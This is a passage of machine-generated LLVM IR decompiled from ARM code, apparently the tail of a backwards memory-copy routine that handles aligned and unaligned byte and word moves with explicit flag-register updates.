dec_label_pc_16e00.loopexit:                      ; preds = %dec_label_pc_16de8
  %v4_16df8 = sub i32 31, %v0_16df8
  %v5_16df8 = and i32 %v4_16df8, %v0_16df8
  %v6_16df8 = icmp slt i32 %v5_16df8, 0
  %v7_16df8 = icmp slt i32 %v2_16df8, 0
  store i1 %v6_16df8, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_16df8, i1* %cpsr_n.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_16e00

dec_label_pc_16e00:                               ; preds = %dec_label_pc_16e00.loopexit, %dec_label_pc_16ddc
  %v6_16e08 = phi i32 [ %v1_16df4, %dec_label_pc_16e00.loopexit ], [ %v0_16dec37, %dec_label_pc_16ddc ]
  %v0_16e10.pr = phi i32 [ %v2_16df8, %dec_label_pc_16e00.loopexit ], [ %v2_16de0, %dec_label_pc_16ddc ]
  %v4_16e00 = add i32 %v0_16e10.pr, 16
  %v6_16e00 = sub i32 0, %v0_16e10.pr
  %v7_16e00 = and i32 %v4_16e00, %v6_16e00
  %v8_16e00 = icmp slt i32 %v7_16e00, 0
  store i1 %v8_16e00, i1* %cpsr_v.global-to-local, align 1
  %v9_16e00 = icmp slt i32 %v4_16e00, 0
  store i1 %v9_16e00, i1* %cpsr_n.global-to-local, align 1
  %v10_16e00 = icmp eq i32 %v4_16e00, 0
  store i1 %v10_16e00, i1* %cpsr_z.global-to-local, align 1
  %v5_16e04 = icmp slt i32 %v0_16e10.pr, -16
  br i1 %v5_16e04, label %.thread2, label %bb147

bb147:                                            ; preds = %dec_label_pc_16e00
  %v6_16e04 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e04 = add i32 %v6_16e04, -4
  %v8_16e04 = inttoptr i32 %v7_16e04 to i32*
  %v9_16e04 = load i32, i32* %v8_16e04, align 4
  store i32 %v9_16e04, i32* @r3, align 4
  %v10_16e04 = add i32 %v6_16e04, -8
  %v11_16e04 = inttoptr i32 %v10_16e04 to i32*
  %v12_16e04 = load i32, i32* %v11_16e04, align 4
  store i32 %v12_16e04, i32* %r4.global-to-local, align 4
  %v13_16e04 = add i32 %v6_16e04, -12
  %v14_16e04 = inttoptr i32 %v13_16e04 to i32*
  %v15_16e04 = load i32, i32* %v14_16e04, align 4
  store i32 %v15_16e04, i32* @ip, align 4
  %v16_16e04 = add i32 %v6_16e04, -16
  %v17_16e04 = inttoptr i32 %v16_16e04 to i32*
  %v18_16e04 = load i32, i32* %v17_16e04, align 4
  store i32 %v18_16e04, i32* %lr.global-to-local, align 4
  store i32 %v16_16e04, i32* %r1.global-to-local, align 4
  %v7_16e08 = add i32 %v6_16e08, -16
  %v8_16e08 = inttoptr i32 %v7_16e08 to i32*
  store i32 %v9_16e04, i32* %v8_16e08, align 4
  %v10_16e08 = add i32 %v6_16e08, -12
  %v11_16e08 = inttoptr i32 %v10_16e08 to i32*
  %v12_16e08 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_16e08, i32* %v11_16e08, align 4
  %v13_16e08 = add i32 %v6_16e08, -8
  %v14_16e08 = inttoptr i32 %v13_16e08 to i32*
  %v15_16e08 = load i32, i32* @ip, align 4
  store i32 %v15_16e08, i32* %v14_16e08, align 4
  %v16_16e08 = add i32 %v6_16e08, -4
  %v17_16e08 = inttoptr i32 %v16_16e08 to i32*
  %v18_16e08 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_16e08, i32* %v17_16e08, align 4
  store i32 %v7_16e08, i32* %r0.global-to-local, align 4
  %v6_16e0c = load i32, i32* %r2.global-to-local, align 4
  %v7_16e0c = add i32 %v6_16e0c, -16
  store i32 %v7_16e0c, i32* %r2.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_16e00, %bb147
  %v6_16e18 = phi i32 [ %v7_16e08, %bb147 ], [ %v6_16e08, %dec_label_pc_16e00 ]
  %v0_16e10 = phi i32 [ %v7_16e0c, %bb147 ], [ %v0_16e10.pr, %dec_label_pc_16e00 ]
  %v4_16e10 = add i32 %v0_16e10, 20
  store i32 %v4_16e10, i32* %r2.global-to-local, align 4
  %v6_16e10 = sub i32 0, %v0_16e10
  %v7_16e10 = and i32 %v4_16e10, %v6_16e10
  %v8_16e10 = icmp slt i32 %v7_16e10, 0
  store i1 %v8_16e10, i1* %cpsr_v.global-to-local, align 1
  %v9_16e10 = icmp slt i32 %v4_16e10, 0
  store i1 %v9_16e10, i1* %cpsr_n.global-to-local, align 1
  %v10_16e10 = icmp eq i32 %v4_16e10, 0
  store i1 %v10_16e10, i1* %cpsr_z.global-to-local, align 1
  %v5_16e14 = icmp slt i32 %v0_16e10, -20
  br i1 %v5_16e14, label %.thread4, label %bb148

bb148:                                            ; preds = %.thread2
  %v6_16e14 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e14 = add i32 %v6_16e14, -4
  %v8_16e14 = inttoptr i32 %v7_16e14 to i32*
  %v9_16e14 = load i32, i32* %v8_16e14, align 4
  store i32 %v9_16e14, i32* @r3, align 4
  %v10_16e14 = add i32 %v6_16e14, -8
  %v11_16e14 = inttoptr i32 %v10_16e14 to i32*
  %v12_16e14 = load i32, i32* %v11_16e14, align 4
  store i32 %v12_16e14, i32* @ip, align 4
  %v13_16e14 = add i32 %v6_16e14, -12
  %v14_16e14 = inttoptr i32 %v13_16e14 to i32*
  %v15_16e14 = load i32, i32* %v14_16e14, align 4
  store i32 %v15_16e14, i32* %lr.global-to-local, align 4
  store i32 %v13_16e14, i32* %r1.global-to-local, align 4
  %v7_16e18 = add i32 %v6_16e18, -12
  %v8_16e18 = inttoptr i32 %v7_16e18 to i32*
  store i32 %v9_16e14, i32* %v8_16e18, align 4
  %v10_16e18 = add i32 %v6_16e18, -8
  %v11_16e18 = inttoptr i32 %v10_16e18 to i32*
  %v12_16e18 = load i32, i32* @ip, align 4
  store i32 %v12_16e18, i32* %v11_16e18, align 4
  %v13_16e18 = add i32 %v6_16e18, -4
  %v14_16e18 = inttoptr i32 %v13_16e18 to i32*
  %v15_16e18 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_16e18, i32* %v14_16e18, align 4
  store i32 %v7_16e18, i32* %r0.global-to-local, align 4
  %v6_16e1c = load i32, i32* %r2.global-to-local, align 4
  %v7_16e1c = add i32 %v6_16e1c, -12
  store i32 %v7_16e1c, i32* %r2.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %.thread2, %bb148
  %v6_16e3c45 = phi i32 [ %v6_16e18, %.thread2 ], [ %v7_16e18, %bb148 ]
  %v0_16e2443 = phi i32 [ %v4_16e10, %.thread2 ], [ %v7_16e1c, %bb148 ]
  %v2_16e20 = load i8*, i8** %stack_var_-8, align 4
  %v3_16e20 = ptrtoint i8* %v2_16e20 to i32
  store i32 %v3_16e20, i32* @r4, align 4
  store i32 %v8_16ddc, i32* @lr, align 4
  br label %dec_label_pc_16e24

dec_label_pc_16e24:                               ; preds = %dec_label_pc_16dd4, %.thread4
  %v7_16e34 = phi i32 [ %v0_16dec37, %dec_label_pc_16dd4 ], [ %v6_16e3c45, %.thread4 ]
  %v0_16e24 = phi i32 [ %v2_16dd4, %dec_label_pc_16dd4 ], [ %v0_16e2443, %.thread4 ]
  %v2_16e24 = add i32 %v0_16e24, 8
  store i32 %v2_16e24, i32* %r2.global-to-local, align 4
  %v4_16e24 = sub i32 0, %v0_16e24
  %v5_16e24 = and i32 %v2_16e24, %v4_16e24
  %v6_16e24 = icmp slt i32 %v5_16e24, 0
  store i1 %v6_16e24, i1* %cpsr_v.global-to-local, align 1
  %v7_16e24 = icmp slt i32 %v2_16e24, 0
  store i1 %v7_16e24, i1* %cpsr_n.global-to-local, align 1
  %v8_16e24 = icmp eq i32 %v2_16e24, 0
  store i1 %v8_16e24, i1* %cpsr_z.global-to-local, align 1
  %v5_16e28 = icmp slt i32 %v0_16e24, -8
  br i1 %v5_16e28, label %bb150, label %dec_label_pc_16e2c

dec_label_pc_16e2c:                               ; preds = %dec_label_pc_16e24
  %v6_16e2c = add i32 %v0_16e24, 4
  store i32 %v6_16e2c, i32* %r2.global-to-local, align 4
  %v8_16e2c = sub i32 -5, %v0_16e24
  %v9_16e2c = and i32 %v8_16e2c, %v2_16e24
  %v10_16e2c = icmp slt i32 %v9_16e2c, 0
  store i1 %v10_16e2c, i1* %cpsr_v.global-to-local, align 1
  %v11_16e2c = icmp slt i32 %v6_16e2c, 0
  store i1 %v11_16e2c, i1* %cpsr_n.global-to-local, align 1
  %v12_16e2c = icmp eq i32 %v2_16e24, 4
  store i1 %v12_16e2c, i1* %cpsr_z.global-to-local, align 1
  %v5_16e30 = icmp slt i32 %v2_16e24, 4
  %v6_16e30 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e30 = add i32 %v6_16e30, -4
  %v8_16e30 = inttoptr i32 %v7_16e30 to i32*
  %v9_16e30 = load i32, i32* %v8_16e30, align 4
  store i32 %v9_16e30, i32* @r3, align 4
  br i1 %v5_16e30, label %.thread8, label %bb149

.thread8:                                         ; preds = %dec_label_pc_16e2c
  store i32 %v7_16e30, i32* %r1.global-to-local, align 4
  %v8_16e34 = add i32 %v7_16e34, -4
  %v9_16e34 = inttoptr i32 %v8_16e34 to i32*
  store i32 %v9_16e30, i32* %v9_16e34, align 4
  %v10_16e34 = load i32, i32* %r0.global-to-local, align 4
  %v11_16e34 = add i32 %v10_16e34, -4
  store i32 %v11_16e34, i32* %r0.global-to-local, align 4
  %v0_16e44.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb150

bb149:                                            ; preds = %dec_label_pc_16e2c
  %v10_16e38 = add i32 %v6_16e30, -8
  %v11_16e38 = inttoptr i32 %v10_16e38 to i32*
  %v12_16e38 = load i32, i32* %v11_16e38, align 4
  store i32 %v12_16e38, i32* @ip, align 4
  store i32 %v10_16e38, i32* %r1.global-to-local, align 4
  %v7_16e3c = add i32 %v7_16e34, -8
  %v8_16e3c = inttoptr i32 %v7_16e3c to i32*
  store i32 %v9_16e30, i32* %v8_16e3c, align 4
  %v10_16e3c = add i32 %v7_16e34, -4
  %v11_16e3c = inttoptr i32 %v10_16e3c to i32*
  %v12_16e3c = load i32, i32* @ip, align 4
  store i32 %v12_16e3c, i32* %v11_16e3c, align 4
  store i32 %v7_16e3c, i32* %r0.global-to-local, align 4
  %v6_16e40 = load i32, i32* %r2.global-to-local, align 4
  %v7_16e40 = add i32 %v6_16e40, -4
  store i32 %v7_16e40, i32* %r2.global-to-local, align 4
  br label %bb150

bb150:                                            ; preds = %.thread8, %.thread14, %dec_label_pc_16e24, %dec_label_pc_16db4, %dec_label_pc_16fe8, %dec_label_pc_16f7c, %dec_label_pc_16f10, %bb149
  %v2_16e48 = phi i32 [ %v11_16e34, %.thread8 ], [ %v0_16ee020, %.thread14 ], [ %v7_16e34, %dec_label_pc_16e24 ], [ %v2_16db8, %dec_label_pc_16db4 ], [ %v2_16e5453, %dec_label_pc_16fe8 ], [ %v2_16e5452, %dec_label_pc_16f7c ], [ %v2_16e5451, %dec_label_pc_16f10 ], [ %v7_16e3c, %bb149 ]
  %v0_16e44 = phi i32 [ %v0_16e44.pre, %.thread8 ], [ %v2_16e88, %.thread14 ], [ %v2_16e24, %dec_label_pc_16e24 ], [ %v2_16dbc, %dec_label_pc_16db4 ], [ %v0_16e4449, %dec_label_pc_16fe8 ], [ %v0_16e4448, %dec_label_pc_16f7c ], [ %v0_16e4447, %dec_label_pc_16f10 ], [ %v7_16e40, %bb149 ]
  %v1_16e44 = add i32 %v0_16e44, 4
  store i32 %v1_16e44, i32* %r2.global-to-local, align 4
  %v3_16e44 = sub i32 0, %v0_16e44
  %v4_16e44 = and i32 %v1_16e44, %v3_16e44
  %v5_16e44 = icmp slt i32 %v4_16e44, 0
  store i1 %v5_16e44, i1* %cpsr_v.global-to-local, align 1
  %v6_16e44 = icmp slt i32 %v1_16e44, 0
  store i1 %v6_16e44, i1* %cpsr_n.global-to-local, align 1
  %v7_16e44 = icmp eq i32 %v1_16e44, 0
  store i1 %v7_16e44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16e44, label %.thread130, label %bb151

bb151:                                            ; preds = %bb150
  %v1_16e4c = add i32 %v0_16e44, 2
  %v3_16e4c = sub i32 -3, %v0_16e44
  %v4_16e4c = and i32 %v3_16e4c, %v1_16e44
  %v5_16e4c = icmp slt i32 %v4_16e4c, 0
  store i1 %v5_16e4c, i1* %cpsr_v.global-to-local, align 1
  %v6_16e4c = icmp slt i32 %v1_16e4c, 0
  store i1 %v6_16e4c, i1* %cpsr_n.global-to-local, align 1
  %v7_16e4c = icmp eq i32 %v1_16e44, 2
  store i1 %v7_16e4c, i1* %cpsr_z.global-to-local, align 1
  %v0_16e50 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e50 = add i32 %v0_16e50, -1
  %v2_16e50 = inttoptr i32 %v1_16e50 to i8*
  %v3_16e50 = load i8, i8* %v2_16e50, align 1
  %v4_16e50 = zext i8 %v3_16e50 to i32
  store i32 %v4_16e50, i32* @r3, align 4
  store i32 %v1_16e50, i32* %r1.global-to-local, align 4
  %v3_16e54 = add i32 %v2_16e48, -1
  %v4_16e54 = inttoptr i32 %v3_16e54 to i8*
  store i8 %v3_16e50, i8* %v4_16e54, align 1
  %v5_16e54 = load i32, i32* %r0.global-to-local, align 4
  %v6_16e54 = add i32 %v5_16e54, -1
  store i32 %v6_16e54, i32* %r0.global-to-local, align 4
  %v0_16e58 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_16e58 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_16e58 = xor i1 %v0_16e58, %v1_16e58
  br i1 %v2_16e58, label %.thread129, label %bb152

bb152:                                            ; preds = %bb151
  %v3_16e58 = load i32, i32* %r1.global-to-local, align 4
  %v4_16e58 = add i32 %v3_16e58, -1
  %v5_16e58 = inttoptr i32 %v4_16e58 to i8*
  %v6_16e58 = load i8, i8* %v5_16e58, align 1
  %v7_16e58 = zext i8 %v6_16e58 to i32
  store i32 %v7_16e58, i32* @r3, align 4
  store i32 %v4_16e58, i32* %r1.global-to-local, align 4
  %v6_16e5c = add i32 %v5_16e54, -2
  %v7_16e5c = inttoptr i32 %v6_16e5c to i8*
  store i8 %v6_16e58, i8* %v7_16e5c, align 1
  %v8_16e5c = load i32, i32* %r0.global-to-local, align 4
  %v9_16e5c = add i32 %v8_16e5c, -1
  store i32 %v9_16e5c, i32* %r0.global-to-local, align 4
  %v1_16e60.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_16e60.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread129

.thread129:                                       ; preds = %bb151, %bb152
  %v7_16e64 = phi i32 [ %v9_16e5c, %bb152 ], [ %v6_16e54, %bb151 ]
  %v2_16e64 = phi i1 [ %v2_16e60.pre, %bb152 ], [ %v1_16e58, %bb151 ]
  %v1_16e64 = phi i1 [ %v1_16e60.pre, %bb152 ], [ %v0_16e58, %bb151 ]
  %v0_16e60 = load i1, i1* %cpsr_z.global-to-local, align 1
  %v3_16e60 = xor i1 %v2_16e64, %v1_16e64
  %v4_16e60 = or i1 %v0_16e60, %v3_16e60
  br i1 %v4_16e60, label %.thread130, label %bb153

bb153:                                            ; preds = %.thread129
  %v5_16e60 = load i32, i32* %r1.global-to-local, align 4
  %v6_16e60 = add i32 %v5_16e60, -1
  %v7_16e60 = inttoptr i32 %v6_16e60 to i8*
  %v8_16e60 = load i8, i8* %v7_16e60, align 1
  %v9_16e60 = zext i8 %v8_16e60 to i32
  store i32 %v9_16e60, i32* @r3, align 4
  store i32 %v6_16e60, i32* %r1.global-to-local, align 4
  %v8_16e64 = add i32 %v7_16e64, -1
  %v9_16e64 = inttoptr i32 %v8_16e64 to i8*
  store i8 %v8_16e60, i8* %v9_16e64, align 1
  %v10_16e64 = load i32, i32* %r0.global-to-local, align 4
  %v11_16e64 = add i32 %v10_16e64, -1
  store i32 %v11_16e64, i32* %r0.global-to-local, align 4
  br label %.thread130

dec_label_pc_16e6c:                               ; preds = %dec_label_pc_16dc4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_16e6c = icmp eq i32 %v1_16dc4, 1
  store i1 %v8_16e6c, i1* %cpsr_n.global-to-local, align 1
  %v9_16e6c = icmp eq i32 %v1_16dc4, 2
  store i1 %v9_16e6c, i1* %cpsr_z.global-to-local, align 1
  %v1_16e70 = add i32 %v2_16db4, -1
  %v2_16e70 = inttoptr i32 %v1_16e70 to i8*
  %v3_16e70 = load i8, i8* %v2_16e70, align 1
  %v4_16e70 = zext i8 %v3_16e70 to i32
  store i32 %v4_16e70, i32* @r3, align 4
  store i32 %v1_16e70, i32* %r1.global-to-local, align 4
  %v3_16e74 = add i32 %v2_16db8, -1
  %v4_16e74 = inttoptr i32 %v3_16e74 to i8*
  store i8 %v3_16e70, i8* %v4_16e74, align 1
  %v5_16e74 = load i32, i32* %r0.global-to-local, align 4
  %v6_16e74 = add i32 %v5_16e74, -1
  store i32 %v6_16e74, i32* %r0.global-to-local, align 4
  br i1 %v8_16e6c, label %.thread14, label %bb154

bb154:                                            ; preds = %dec_label_pc_16e6c
  %v6_16e78 = load i32, i32* %r1.global-to-local, align 4
  %v7_16e78 = add i32 %v6_16e78, -1
  %v8_16e78 = inttoptr i32 %v7_16e78 to i8*
  %v9_16e78 = load i8, i8* %v8_16e78, align 1
  %v10_16e78 = zext i8 %v9_16e78 to i32
  store i32 %v10_16e78, i32* @r3, align 4
  store i32 %v7_16e78, i32* %r1.global-to-local, align 4
  %v9_16e7c = add i32 %v5_16e74, -2
  %v10_16e7c = inttoptr i32 %v9_16e7c to i8*
  store i8 %v9_16e78, i8* %v10_16e7c, align 1
  %v11_16e7c = load i32, i32* %r0.global-to-local, align 4
  %v12_16e7c = add i32 %v11_16e7c, -1
  store i32 %v12_16e7c, i32* %r0.global-to-local, align 4
  br i1 %v9_16e6c, label %.thread14, label %bb155

bb155:                                            ; preds = %bb154
  %v8_16e80 = load i32, i32* %r1.global-to-local, align 4
  %v9_16e80 = add i32 %v8_16e80, -1
  %v10_16e80 = inttoptr i32 %v9_16e80 to i8*
  %v11_16e80 = load i8, i8* %v10_16e80, align 1
  %v12_16e80 = zext i8 %v11_16e80 to i32
  store i32 %v12_16e80, i32* @r3, align 4
  store i32 %v9_16e80, i32* %r1.global-to-local, align 4
  %v11_16e84 = add i32 %v11_16e7c, -2
  %v12_16e84 = inttoptr i32 %v11_16e84 to i8*
  store i8 %v11_16e80, i8* %v12_16e84, align 1
  %v13_16e84 = load i32, i32* %r0.global-to-local, align 4
  %v14_16e84 = add i32 %v13_16e84, -1
  store i32 %v14_16e84, i32* %r0.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %bb154, %dec_label_pc_16e6c, %bb155
  %v0_16ee020 = phi i32 [ %v12_16e7c, %bb154 ], [ %v6_16e74, %dec_label_pc_16e6c ], [ %v14_16e84, %bb155 ]
  %v0_16e88 = load i32, i32* %r2.global-to-local, align 4
  %v1_16e88 = load i32, i32* @ip, align 4
  %v2_16e88 = sub i32 %v0_16e88, %v1_16e88
  store i32 %v2_16e88, i32* %r2.global-to-local, align 4
  %v4_16e88 = xor i32 %v1_16e88, %v0_16e88
  %v5_16e88 = xor i32 %v2_16e88, %v0_16e88
  %v6_16e88 = and i32 %v5_16e88, %v4_16e88
  %v7_16e88 = icmp slt i32 %v6_16e88, 0
  store i1 %v7_16e88, i1* %cpsr_v.global-to-local, align 1
  %v8_16e88 = icmp slt i32 %v2_16e88, 0
  store i1 %v8_16e88, i1* %cpsr_n.global-to-local, align 1
  %v9_16e88 = icmp eq i32 %v0_16e88, %v1_16e88
  store i1 %v9_16e88, i1* %cpsr_z.global-to-local, align 1
  %v5_16e8c = icmp slt i32 %v0_16e88, %v1_16e88
  br i1 %v5_16e8c, label %bb150, label %dec_label_pc_16e90

dec_label_pc_16e90:                               ; preds = %.thread14
  %v0_16e90 = load i32, i32* %r1.global-to-local, align 4
  %v1_16e90 = urem i32 %v0_16e90, 4
  store i32 %v1_16e90, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16e90 = icmp eq i32 %v1_16e90, 0
  store i1 %v2_16e90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16e90, label %dec_label_pc_16dd4, label %dec_label_pc_16e98

dec_label_pc_16e98:                               ; preds = %dec_label_pc_16dcc, %dec_label_pc_16e90
  %v0_16ee019 = phi i32 [ %v2_16db8, %dec_label_pc_16dcc ], [ %v0_16ee020, %dec_label_pc_16e90 ]
  %v0_16f8c = phi i32 [ %v2_16dbc, %dec_label_pc_16dcc ], [ %v2_16e88, %dec_label_pc_16e90 ]
  %v0_16e98 = phi i32 [ %v2_16db4, %dec_label_pc_16dcc ], [ %v0_16e90, %dec_label_pc_16e90 ]
  %v0_16ea0 = phi i32 [ %v1_16dcc, %dec_label_pc_16dcc ], [ %v1_16e90, %dec_label_pc_16e90 ]
  %v1_16e98 = and i32 %v0_16e98, -4
  store i32 %v1_16e98, i32* %r1.global-to-local, align 4
  %v1_16e9c = inttoptr i32 %v1_16e98 to i32*
  %v2_16e9c = load i32, i32* %v1_16e9c, align 4
  store i32 %v2_16e9c, i32* @r3, align 4
  %v7_16ea0 = icmp ult i32 %v0_16ea0, 2
  %v2_16f84 = add i32 %v0_16f8c, -12
  %v4_16f84 = sub i32 11, %v0_16f8c
  %v5_16f84 = and i32 %v4_16f84, %v0_16f8c
  %v6_16f84 = icmp slt i32 %v5_16f84, 0
  store i1 %v6_16f84, i1* %cpsr_v.global-to-local, align 1
  %v7_16f84 = icmp slt i32 %v2_16f84, 0
  store i1 %v7_16f84, i1* %cpsr_n.global-to-local, align 1
  %v8_16f84 = icmp eq i32 %v0_16f8c, 12
  store i1 %v8_16f84, i1* %cpsr_z.global-to-local, align 1
  %v5_16f88 = icmp slt i32 %v0_16f8c, 12
  br i1 %v7_16ea0, label %dec_label_pc_16f84, label %dec_label_pc_16ea8

dec_label_pc_16ea8:                               ; preds = %dec_label_pc_16e98
  %v8_16ea0 = icmp eq i32 %v0_16ea0, 2
  br i1 %v8_16ea0, label %dec_label_pc_16f18, label %dec_label_pc_16eac

dec_label_pc_16eac:                               ; preds = %dec_label_pc_16ea8
  br i1 %v5_16f88, label %dec_label_pc_16ef8, label %dec_label_pc_16eb4

dec_label_pc_16eb4:                               ; preds = %dec_label_pc_16eac
  store i32 %v2_16f84, i32* %r2.global-to-local, align 4
  %v3_16eb8 = load i32, i32* @r4, align 4
  store i32 %v3_16eb8, i32* %stack_var_-12, align 4
  %v6_16eb8 = load i32, i32* @r5, align 4
  %v8_16eb8 = inttoptr i32 %v6_16eb8 to i8*
  store i8* %v8_16eb8, i8** %stack_var_-8, align 4
  %v11_16eb8 = load i32, i32* @lr, align 4
  br label %dec_label_pc_16ebc

dec_label_pc_16ebc:                               ; preds = %dec_label_pc_16ebc.dec_label_pc_16ebc_crit_edge, %dec_label_pc_16eb4
  %v0_16ee0 = phi i32 [ %v1_16ee0, %dec_label_pc_16ebc.dec_label_pc_16ebc_crit_edge ], [ %v0_16ee019, %dec_label_pc_16eb4 ]
  %v0_16ec0 = phi i32 [ %v0_16ec0.pre, %dec_label_pc_16ebc.dec_label_pc_16ebc_crit_edge ], [ %v1_16e98, %dec_label_pc_16eb4 ]
  %v0_16ebc = phi i32 [ %v0_16ebc.pre, %dec_label_pc_16ebc.dec_label_pc_16ebc_crit_edge ], [ %v2_16e9c, %dec_label_pc_16eb4 ]
  %v3_16ebc = mul i32 %v0_16ebc, 256
  store i32 %v3_16ebc, i32* %lr.global-to-local, align 4
  %v1_16ec0 = add i32 %v0_16ec0, -4
  %v2_16ec0 = inttoptr i32 %v1_16ec0 to i32*
  %v3_16ec0 = load i32, i32* %v2_16ec0, align 4
  store i32 %v3_16ec0, i32* @r3, align 4
  %v4_16ec0 = add i32 %v0_16ec0, -8
  %v5_16ec0 = inttoptr i32 %v4_16ec0 to i32*
  %v6_16ec0 = load i32, i32* %v5_16ec0, align 4
  store i32 %v6_16ec0, i32* %r4.global-to-local, align 4
  %v7_16ec0 = add i32 %v0_16ec0, -12
  %v8_16ec0 = inttoptr i32 %v7_16ec0 to i32*
  %v9_16ec0 = load i32, i32* %v8_16ec0, align 4
  store i32 %v9_16ec0, i32* %r5.global-to-local, align 4
  %v10_16ec0 = add i32 %v0_16ec0, -16
  %v11_16ec0 = inttoptr i32 %v10_16ec0 to i32*
  %v12_16ec0 = load i32, i32* %v11_16ec0, align 4
  store i32 %v10_16ec0, i32* %r1.global-to-local, align 4
  %v4_16ec4 = udiv i32 %v12_16ec0, 16777216
  %v5_16ec4 = or i32 %v4_16ec4, %v3_16ebc
  store i32 %v5_16ec4, i32* %lr.global-to-local, align 4
  %v3_16ec8 = mul i32 %v12_16ec0, 256
  %v4_16ecc = udiv i32 %v9_16ec0, 16777216
  %v5_16ecc = or i32 %v3_16ec8, %v4_16ecc
  store i32 %v5_16ecc, i32* @ip, align 4
  %v3_16ed0 = mul i32 %v9_16ec0, 256
  %v4_16ed4 = udiv i32 %v6_16ec0, 16777216
  %v5_16ed4 = or i32 %v3_16ed0, %v4_16ed4
  store i32 %v5_16ed4, i32* %r5.global-to-local, align 4
  %v3_16ed8 = mul i32 %v6_16ec0, 256
  %v4_16edc = udiv i32 %v3_16ec0, 16777216
  %v5_16edc = or i32 %v3_16ed8, %v4_16edc
  store i32 %v5_16edc, i32* %r4.global-to-local, align 4
  %v1_16ee0 = add i32 %v0_16ee0, -16
  %v2_16ee0 = inttoptr i32 %v1_16ee0 to i32*
  store i32 %v5_16edc, i32* %v2_16ee0, align 4
  %v4_16ee0 = add i32 %v0_16ee0, -12
  %v5_16ee0 = inttoptr i32 %v4_16ee0 to i32*
  %v6_16ee0 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_16ee0, i32* %v5_16ee0, align 4
  %v7_16ee0 = add i32 %v0_16ee0, -8
  %v8_16ee0 = inttoptr i32 %v7_16ee0 to i32*
  %v9_16ee0 = load i32, i32* @ip, align 4
  store i32 %v9_16ee0, i32* %v8_16ee0, align 4
  %v10_16ee0 = add i32 %v0_16ee0, -4
  %v11_16ee0 = inttoptr i32 %v10_16ee0 to i32*
  %v12_16ee0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_16ee0, i32* %v11_16ee0, align 4
  store i32 %v1_16ee0, i32* %r0.global-to-local, align 4
  %v0_16ee4 = load i32, i32* %r2.global-to-local, align 4
  %v2_16ee4 = add i32 %v0_16ee4, -16
  store i32 %v2_16ee4, i32* %r2.global-to-local, align 4
  %v6_16ee8 = icmp slt i32 %v0_16ee4, 16
  br i1 %v6_16ee8, label %dec_label_pc_16eec, label %dec_label_pc_16ebc.dec_label_pc_16ebc_crit_edge

dec_label_pc_16ebc.dec_label_pc_16ebc_crit_edge:  ; preds = %dec_label_pc_16ebc
  %v0_16ebc.pre = load i32, i32* @r3, align 4
  %v0_16ec0.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_16ebc

dec_label_pc_16eec:                               ; preds = %dec_label_pc_16ebc
  %v2_16eec = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16eec, i32* @r4, align 4
  %v5_16eec = load i8*, i8** %stack_var_-8, align 4
  %v6_16eec = ptrtoint i8* %v5_16eec to i32
  store i32 %v6_16eec, i32* @r5, align 4
  store i32 %v11_16eb8, i32* @lr, align 4
  %v2_16ef0 = add i32 %v0_16ee4, -4
  store i32 %v2_16ef0, i32* %r2.global-to-local, align 4
  %v4_16ef0 = add i32 %v0_16ee4, 2147483632
  %v5_16ef0 = and i32 %v2_16ef0, %v4_16ef0
  %v6_16ef0 = icmp slt i32 %v5_16ef0, 0
  store i1 %v6_16ef0, i1* %cpsr_v.global-to-local, align 1
  %v7_16ef0 = icmp slt i32 %v2_16ef0, 0
  store i1 %v7_16ef0, i1* %cpsr_n.global-to-local, align 1
  %v8_16ef0 = icmp eq i32 %v2_16ef0, 0
  store i1 %v8_16ef0, i1* %cpsr_z.global-to-local, align 1
  %v5_16ef4 = icmp slt i32 %v2_16ee4, -12
  br i1 %v5_16ef4, label %dec_label_pc_16f10, label %dec_label_pc_16ef8

dec_label_pc_16ef8:                               ; preds = %dec_label_pc_16eec, %dec_label_pc_16eac, %dec_label_pc_16ef8
  %v1_16f04 = phi i32 [ %v5_16f04, %dec_label_pc_16ef8 ], [ %v1_16ee0, %dec_label_pc_16eec ], [ %v0_16ee019, %dec_label_pc_16eac ]
  %v0_16ef8 = load i32, i32* @r3, align 4
  %v3_16ef8 = mul i32 %v0_16ef8, 256
  store i32 %v3_16ef8, i32* %ip.global-to-local, align 4
  %v0_16efc = load i32, i32* %r1.global-to-local, align 4
  %v1_16efc = add i32 %v0_16efc, -4
  %v2_16efc = inttoptr i32 %v1_16efc to i32*
  %v3_16efc = load i32, i32* %v2_16efc, align 4
  store i32 %v3_16efc, i32* @r3, align 4
  store i32 %v1_16efc, i32* %r1.global-to-local, align 4
  %v4_16f00 = udiv i32 %v3_16efc, 16777216
  %v5_16f00 = or i32 %v4_16f00, %v3_16ef8
  store i32 %v5_16f00, i32* @ip, align 4
  %v2_16f04 = add i32 %v1_16f04, -4
  %v3_16f04 = inttoptr i32 %v2_16f04 to i32*
  store i32 %v5_16f00, i32* %v3_16f04, align 4
  %v4_16f04 = load i32, i32* %r0.global-to-local, align 4
  %v5_16f04 = add i32 %v4_16f04, -4
  store i32 %v5_16f04, i32* %r0.global-to-local, align 4
  %v0_16f08 = load i32, i32* %r2.global-to-local, align 4
  %v2_16f08 = add i32 %v0_16f08, -4
  store i32 %v2_16f08, i32* %r2.global-to-local, align 4
